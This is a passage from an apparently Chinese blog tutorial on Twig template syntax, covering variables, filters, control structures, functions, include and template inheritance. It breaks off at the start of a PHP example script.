title="变量"></a>变量</h4><p>​应用程序将变量传入模板中进行处理，变量可以包含你能访问的属性或元素。你可以使用 <code>.</code>来访问变量中的属性（方法或 PHP 对象的属性，或 PHP 数组单元），Twig还支持访问PHP数组上的项的特定语法， 其中对于<code>hada[&#39;gaga&#39;]</code>的访问示例如下：</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; hada.gaga &#125;&#125;</span><span class="template-variable">&#123;&#123; hada[<span class="string">&#x27;gaga&#x27;</span>] &#125;&#125;</span></span><br></pre></td></tr></table></figure><h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><p>​Twig模板中存在这些全局变量：</p><blockquote><p>_self：引用当前模板名称；（在twig1.x和2.x&#x2F;3.x作用不一）<br>_context：引用当前上下文；<br>_charset：引用当前字符集。</p></blockquote><h4 id="声明变量"><a href="#声明变量" class="headerlink" title="声明变量"></a>声明变量</h4><p>​为代码块内的变量赋值。赋值使用<code>set</code>标签：</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">set</span> hada = <span class="string">&#x27;gaga&#x27;</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">set</span> hada = [<span class="number">1</span>, <span class="number">2</span>] <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">set</span> hada = &#123;<span class="string">&#x27;hada&#x27;</span>: <span class="string">&#x27;gaga&#x27;</span>&#125; <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure><h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><p>​过滤器用于对变量内容进行格式化或修改操作，类似于管道处理（如：<code>&#123;&#123; var|filter &#125;&#125;</code>），常用于：</p><blockquote><ul><li>文本格式化（大小写转换、截断等）</li><li>数据转换（日期格式化、JSON编码等）</li><li>集合处理（排序、切片等）</li><li>逻辑判断（默认值设置等）</li></ul></blockquote><h5 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h5><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&#123;# 基础用法 #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; variable<span class="punctuation">|</span>filterName &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="comment">&#123;# 带参数用法 #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; variable<span class="punctuation">|</span>filterName(arg<span class="number">1</span>, arg<span class="number">2</span>) &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="comment">&#123;# 链式调用 #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; variable<span class="punctuation">|</span><span class="keyword">filter</span><span class="number">1</span><span class="punctuation">|</span><span class="keyword">filter</span><span class="number">2</span> &#125;&#125;</span></span><br></pre></td></tr></table></figure><p>​若要对代码部分应用筛选器，使用<code>apply</code>标签或者<code>filter</code>标签：</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">apply</span> upper <span class="template-tag">%&#125;</span><span class="language-xml">This text becomes uppercase</span><span class="template-tag">&#123;%</span> <span class="name">endapply</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">filter</span> upper <span class="template-tag">%&#125;</span><span class="language-xml">This text becomes uppercase</span><span class="template-tag">&#123;%</span> <span class="name">endfilter</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure><p>​其中<code>apply</code>标签在Twig <strong>1.40 版本之前不存在</strong>，而<code>filter</code>标签<strong>兼容所有</strong> Twig 1.x 版本</p><blockquote><p>官方说明：<code>apply</code> 是 <code>filter</code> 的别名，二者功能完全一致，更新后建议优先使用 <code>apply</code> 以保持与 Twig 3.x 的兼容性</p></blockquote><h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><h6 id="日期格式化-date"><a href="#日期格式化-date" class="headerlink" title="日期格式化 (date)"></a>日期格式化 (<code>date</code>)</h6><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; post.date<span class="punctuation">|</span><span class="keyword">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>) &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="comment">&#123;# 输出：2023-07-20 14:30:00 #&#125;</span></span><br></pre></td></tr></table></figure><h6 id="大小写转换"><a href="#大小写转换" class="headerlink" title="大小写转换"></a>大小写转换</h6><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; <span class="string">&#x27;Hello World&#x27;</span><span class="punctuation">|</span><span class="keyword">lower</span> &#125;&#125;</span><span class="language-xml"> </span><span class="comment">&#123;# 输出：hello world #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; <span class="string">&#x27;hello world&#x27;</span><span class="punctuation">|</span><span class="keyword">upper</span> &#125;&#125;</span><span class="language-xml"> </span><span class="comment">&#123;# 输出：HELLO WORLD #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; <span class="string">&#x27;hello world&#x27;</span><span class="punctuation">|</span><span class="keyword">capitalize</span> &#125;&#125;</span><span class="language-xml"> </span><span class="comment">&#123;# 输出：Hello World #&#125;</span></span><br></pre></td></tr></table></figure><h6 id="默认值-default"><a href="#默认值-default" class="headerlink" title="默认值 (default)"></a>默认值 (<code>default</code>)</h6><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; user.name<span class="punctuation">|</span><span class="keyword">default</span>(<span class="string">&#x27;Anonymous&#x27;</span>) &#125;&#125;</span><span class="language-xml"> </span></span><br><span class="line"><span class="language-xml"></span><span class="comment">&#123;# 当user.name未定义时输出 Anonymous #&#125;</span></span><br></pre></td></tr></table></figure><h6 id="数组切片-slice"><a href="#数组切片-slice" class="headerlink" title="数组切片 (slice)"></a>数组切片 (<code>slice</code>)</h6><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]<span class="punctuation">|</span><span class="keyword">slice</span>(<span class="number">1</span>, <span class="number">3</span>)<span class="punctuation">|</span><span class="keyword">join</span>(<span class="string">&#x27;, &#x27;</span>) &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="comment">&#123;# 输出：2, 3, 4（从索引1开始取3个元素）#&#125;</span></span><br></pre></td></tr></table></figure><h4 id="控制结构"><a href="#控制结构" class="headerlink" title="控制结构"></a>控制结构</h4>​控制结构是指所有控制程序流的代码，例如条件语句，循环语句以及条件+循环组合的代码块。控制结构使用{%%}。<h5 id="条件语句（if语句）："><a href="#条件语句（if语句）：" class="headerlink" title="条件语句（if语句）："></a>条件语句（<code>if</code>语句）：</h5><h6 id="基础用法"><a href="#基础用法" class="headerlink" title="基础用法"></a>基础用法</h6><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">if</span> temperature &gt; <span class="number">30</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    🥵 高温预警！</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">elseif</span> temperature &lt; <span class="number">5</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    🥶 低温警报！</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">else</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    🌤️ 天气舒适</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endif</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure><h6 id="复合条件"><a href="#复合条件" class="headerlink" title="复合条件"></a>复合条件</h6><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">if</span> user.isLoggedIn and user.role == <span class="string">&#x27;admin&#x27;</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    👑 欢迎管理员 </span><span class="template-variable">&#123;&#123; user.name &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">elseif</span> user.isLoggedIn <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    👋 欢迎回来 </span><span class="template-variable">&#123;&#123; user.name &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">else</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    🔒 请先登录</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endif</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure><h6 id="空值校验"><a href="#空值校验" class="headerlink" title="空值校验"></a>空值校验</h6><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">if</span> comments is empty <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    😞 还没有评论</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endif</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure><h5 id="循环控制-for-循环"><a href="#循环控制-for-循环" class="headerlink" title="循环控制 (for 循环)"></a>循环控制 (<code>for</code> 循环)</h5><h6 id="遍历数组"><a href="#遍历数组" class="headerlink" title="遍历数组"></a>遍历数组</h6><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">for</span> user <span class="keyword">in</span> users <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><span class="template-variable">&#123;&#123; loop.index &#125;&#125;</span><span class="language-xml">. </span><span class="template-variable">&#123;&#123; user.name &#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">else</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>⚠️ 没有用户数据<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br></pre></td></tr></table></figure><blockquote><ul><li><code>loop.index</code> 从1开始的计数</li><li><code>loop.index0</code> 从0开始的计数</li><li><code>loop.first</code> 是否是第一个元素</li><li><code>loop.last</code> 是否是最后一个元素</li></ul></blockquote><h6 id="遍历关联数组"><a href="#遍历关联数组" class="headerlink" title="遍历关联数组"></a>遍历关联数组</h6><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">for</span> key, value <span class="keyword">in</span> settings <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-variable">&#123;&#123; key &#125;&#125;</span><span class="language-xml">: </span><span class="template-variable">&#123;&#123; value &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure><h6 id="限定循环范围"><a href="#限定循环范围" class="headerlink" title="限定循环范围"></a>限定循环范围</h6><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&#123;# 只显示前3条新闻 #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">for</span> news <span class="keyword">in</span> newsList<span class="punctuation">|</span><span class="keyword">slice</span>(0, <span class="number">3</span>) <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-variable">&#123;&#123; news.title &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure><h5 id="循环-条件组合"><a href="#循环-条件组合" class="headerlink" title="循环 + 条件组合"></a>循环 + 条件组合</h5><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">for</span> product <span class="keyword">in</span> products if product.stock &gt; 0 <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    ✅ </span><span class="template-variable">&#123;&#123; product.name &#125;&#125;</span><span class="language-xml"> (库存: </span><span class="template-variable">&#123;&#123; product.stock &#125;&#125;</span><span class="language-xml">)</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">else</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    😥 所有商品已售罄</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure><h5 id="完整示例"><a href="#完整示例" class="headerlink" title="完整示例"></a>完整示例</h5><p>​以下是一个完整的示例：</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&#123;# 模拟数据 #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">set</span> users = [</span><br><span class="line">    &#123;name: <span class="string">&#x27;张三&#x27;</span>, role: <span class="string">&#x27;user&#x27;</span>&#125;,</span><br><span class="line">    &#123;name: <span class="string">&#x27;李四&#x27;</span>, role: <span class="string">&#x27;admin&#x27;</span>&#125;,</span><br><span class="line">    &#123;name: <span class="string">&#x27;王五&#x27;</span>, role: <span class="string">&#x27;editor&#x27;</span>&#125;</span><br><span class="line">] <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="comment">&#123;# 带条件的循环 #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">for</span> user <span class="keyword">in</span> users <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-variable">&#123;&#123; loop.index &#125;&#125;</span><span class="language-xml">. </span></span><br><span class="line"><span class="language-xml">        </span><span class="template-variable">&#123;&#123; user.name<span class="punctuation">|</span><span class="keyword">upper</span> &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-tag">&#123;%</span> <span class="name">if</span> user.role == <span class="string">&#x27;admin&#x27;</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">            (管理员)</span></span><br><span class="line"><span class="language-xml">        </span><span class="template-tag">&#123;%</span> <span class="name">endif</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h5 id="特殊循环控制"><a href="#特殊循环控制" class="headerlink" title="特殊循环控制"></a>特殊循环控制</h5><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">for</span> i <span class="keyword">in</span> <span class="number">0</span>..<span class="number">10</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-variable">&#123;&#123; i &#125;&#125;</span><span class="language-xml"> </span><span class="comment">&#123;# 输出0到10 #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">for</span> letter <span class="keyword">in</span> <span class="string">&#x27;a&#x27;</span>..<span class="string">&#x27;z&#x27;</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-variable">&#123;&#123; letter &#125;&#125;</span><span class="language-xml"> </span><span class="comment">&#123;# 输出a到z #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>​在Twig中存在一些内置函数，如生成序列(<code>range</code>)，日期(<code>data</code>)。</p><h5 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h5><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">for</span> i <span class="keyword">in</span> <span class="name">range</span>(<span class="number">1</span>, <span class="number">5</span>) <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-variable">&#123;&#123; i &#125;&#125;</span><span class="language-xml"> </span><span class="comment">&#123;# 输出：1 2 3 4 5 #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">for</span> letter <span class="keyword">in</span> <span class="name">range</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;z&#x27;</span>) <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-variable">&#123;&#123; letter &#125;&#125;</span><span class="language-xml"> </span><span class="comment">&#123;# 输出 a 到 z #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure><h4 id="引入其他模板"><a href="#引入其他模板" class="headerlink" title="引入其他模板"></a>引入其他模板</h4><p>​Twig 提供的 <code>include</code>函数可以使你更方便地在模板中引入模板，并将该模板已渲染后的内容返回到当前模板</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; <span class="name">include</span>(<span class="string">&#x27;other.html&#x27;</span>) &#125;&#125;</span></span><br></pre></td></tr></table></figure><h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p>​Twig最强大的部分是模板继承。模板继承允许您构建一个基本的“skeleton”模板，该模板包含站点的所有公共元素并定义子模版可以覆写的 blocks 块。</p><p>​为便于理解，以下是一个基础模板继承（经典三明治结构）的示例：</p><h5 id="父模板base-html-twig"><a href="#父模板base-html-twig" class="headerlink" title="父模板base.html.twig"></a>父模板<code>base.html.twig</code></h5><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span></span><span class="template-tag">&#123;%</span> <span class="name">block</span> title <span class="template-tag">%&#125;</span><span class="language-xml">title</span><span class="template-tag">&#123;%</span> <span class="name">endblock</span> <span class="template-tag">%&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;%</span> <span class="name">block</span> styles <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">endblock</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;%</span> <span class="name">block</span> header <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;header&quot;</span>&gt;</span>head<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;%</span> <span class="name">endblock</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;%</span> <span class="name">block</span> content <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">endblock</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;%</span> <span class="name">block</span> footer <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer&quot;</span>&gt;</span>© 2023 mywebsite<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;%</span> <span class="name">endblock</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>​在这个例子中，<code>block</code> 标签定义了 5 个块，可以由子模版进行填充。对于模板引擎来说，所有的 <code>block</code> 标签都可以由子模版来覆写该部分。</p><h5 id="子模板page-html-twig"><a href="#子模板page-html-twig" class="headerlink" title="子模板page.html.twig"></a>子模板<code>page.html.twig</code></h5><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">extends</span> <span class="string">&quot;base.html.twig&quot;</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">block</span> title <span class="template-tag">%&#125;</span><span class="language-xml">about us - </span><span class="template-variable">&#123;&#123; <span class="name">parent</span>() &#125;&#125;</span><span class="template-tag">&#123;%</span> <span class="name">endblock</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">block</span> styles <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-variable">&#123;&#123; <span class="name">parent</span>() &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/css/about.css&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endblock</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">block</span> content <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>introduction<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>There is introduction about our company<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endblock</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure><p>​其中的 <code>extends</code> 标签是关键所在，其必须是模板的第一个标签。 <code>extends</code> 标签告诉模板引擎当前模板扩展自另一个父模板，当模板引擎评估编译这个模板时，首先会定位到父模板。</p><h5 id="PHP脚本page-php"><a href="#PHP脚本page-php" class="headerlink" title="PHP脚本page.php"></a>PHP脚本<code>page.php</code></h5><p>​使用如下PHP脚本调用模板</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 